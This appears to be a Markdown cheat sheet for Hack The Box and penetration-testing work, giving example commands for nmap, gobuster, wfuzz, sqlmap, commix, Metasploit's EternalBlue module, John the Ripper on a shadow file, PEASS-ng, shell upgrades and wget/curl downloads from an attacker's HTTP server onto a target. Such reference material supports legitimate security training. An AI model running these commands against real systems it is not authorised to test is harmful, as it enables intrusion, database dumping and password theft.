# 🛠️ HTB Cheat Sheet
Your compact reference for essential tools and techniques in penetration testing and CTF challenges.

## 📋 Table of Contents
- [Reconnaissance](#-reconnaissance)
- [Web Application Testing](#-web-application-testing)
- [Exploitation](#-exploitation)
- [Password Attacks](#-password-attacks)
- [Privilege Escalation](#-privilege-escalation)
- [Post-Exploitation](#-post-exploitation)
- [Useful Resources](#-useful-resources)

## 🔎 Reconnaissance
### 🔍 Nmap
Network scanner to identify open ports and services.

#### Common Options
- -p: Specify port(s) (e.g., -p 80,443 or -p 1-1000)
- -sV: Service/version detection
- -sC: Default script scan
- -A: Aggressive scan (OS detection, version detection, script scanning, and traceroute)
- -T[0-5]: Set timing template (e.g., T4 = faster, T5 = aggressive)
- -sU: UDP scans
- 
#### Example
```bash
# Basic scan
nmap -sV -sC -T4 10.10.10.10
```
```bash
# Full port scan
nmap -p- -T4 10.10.10.10
```
```bash
# Scan specific ports with scripts
nmap -p 80,443 --script=http-enum,ssl-enum-ciphers 10.10.10.10
```

🔗 [nmap.org](https://nmap.org/)

### 🧠 Wappalyzer
Browser extension that identifies technologies used on websites.  

🔗 [wappalyzer.com](https://www.wappalyzer.com/)

## 🌐 Web Application Testing
### 🍳 CyberChef
Web-based tool for encoding, decoding, encryption, formatting, and more.  

#### Common Features:
- Base64 Encode/Decode
- URL Encode/Decode
- Hex operations
- Hash generation

🔗 [CyberChef](https://gchq.github.io/CyberChef/)

## 🔍 Directory Enumeration

### 🍕 GoBuster
Discover hidden directories and files on web servers.

#### Example
```bash
# Gobuster directory scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

### 🎯 Wfuzz
Web application fuzzer for brute-forcing parameters, directories, etc.  

#### Common Options
- -c: Colorized output
- -w: Wordlist path
- -u: Target URL (use FUZZ as injection point)
- --hc/hl/hw/hh: Hide responses with specified code/lines/words/chars

#### Example
```bash
# Directory bruteforce
wfuzz -c -w /usr/share/wordlists/dirb/common.txt http://target.com/FUZZ
```
```bash
# Parameter fuzzing
wfuzz -c -w /usr/share/wordlists/dirb/common.txt http://target.com/index.php?id=FUZZ
```
```bash
# Subdomain enumeration
wfuzz -c -w /usr/share/wordlists/subdomains.txt -H "Host: FUZZ.target.com" http://target.com
```

🔗 [Wfuzz GitHub](https://github.com/xmendez/wfuzz)

### 💉 SQLMap
Automated SQL injection and database takeover tool.  

#### Common Options
- -u: Target URL
- --data: POST data
- --dbs: Enumerate databases
- --dump: Dump table contents
- --batch: Non-interactive mode
- --risk=(1-3): Risk of tests (3=more dangerous tests)
- --level=(1-5): Level of tests (5=more tests)

#### Example
```bash
# Basic scan
sqlmap -u "http://example.com/page.php?id=1" --dbs
```
```bash
# POST data scan
sqlmap -u "http://example.com/login.php" --data="username=test&password=test" --dbs
```

🔗 [sqlmap.org](https://sqlmap.org/)

### 🔌 Commix
Automated command injection exploitation tool.  

#### Common Options  
- -u: Target URL
- --data: POST data
- --cookie: HTTP cookie header
- --file-write/file-dest: Upload files to target
- --os-shell: Prompt for an interactive shell

#### Example
```bash
# Basic scan
commix -u "http://example.com/vulnerable.php?cmd=id"
```
```bash
# POST data scan
commix -u "http://example.com/vulnerable.php" --data="parameter=value"
```

🔗 [github.com/commixproject/commix](https://github.com/commixproject/commix)

## 💣 Exploitation
### 🐚 Reverse Shell Generator
Generates one-liners for various reverse shell payloads.

🔗 [revshells.com](https://revshells.com)

### 🧨 Metasploit
Comprehensive framework for exploitation and post-exploitation.  

#### Example
```bash
# Start Metasploit
msfconsole
```
```bash
# Search for exploits
search type:exploit platform:windows ms17-010
search cve:2021 type:exploit
```
```bash
# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
```
```bash
# Set options
set RHOSTS 10.10.10.10
set LHOST 10.10.10.1
```
```bash
# Run the exploit
exploit
```

🔗 [Metasploit Framework](https://www.metasploit.com/)

## 🔓 Password Attacks
### 🔑 John the Ripper
Password cracking tool supporting various hash types.  

#### Common Options
- --wordlist: Specify wordlist
- --format: Hash format (md5, sha1, etc.)
- --show: Show cracked passwords

#### Example
```bash
# Crack Linux shadow file
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```
```bash
# Crack hash directly
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

🔗 [John the Ripper](https://www.openwall.com/john/)

## 🔝 Privilege Escalation
### 🔼 PEASS-ng
Scripts for privilege escalation on Windows and Linux.  

#### Common Features:
- Checks for misconfigurations
- Identifies vulnerable software
- Finds credential files
- Detects weak permissions

#### Example
```bash
# Linux
./linpeas.sh
```
```bash
# Windows
.\winPEAS.exe
```

🔗 [PEASS-ng GitHub](https://github.com/carlospolop/PEASS-ng)

## 🛠️ Post-Exploitation

### 🔧 TTY Shell Upgrades
Improve limited shells to fully interactive TTYs.  

#### Example
```bash
# Python PTY method (also try python3 if python fails)
python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
# Configure terminal
export TERM=xterm-256color
stty rows 67 columns 318
```

## 📡 File Transfer Methods
Move files between your machine and the target.

#### Example
```bash
# Using Python HTTP server (on your machine)
python3 -m http.server 8000
```
```bash
# Download file (on target)
wget http://your-ip:8000/file.txt
curl http://your-ip:8000/file.txt -o file.txt
```

## 📚 Useful Resources

### 📖 HackTricks
Knowledge base for offensive security techniques.

🔗 [book.hacktricks.xyz](https://book.hacktricks.xyz)

### 📚 Wordlists
Collections of words and patterns for brute-forcing and fuzzing.

#### Common Wordlists:
- [KaliLists](https://www.kali.org/tools/wordlists/) - Default wordlists in Kali Linux
- [SecLists](https://github.com/danielmiessler/SecLists) - Collection of multiple types of lists
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Useful payloads and bypass for various scenarios
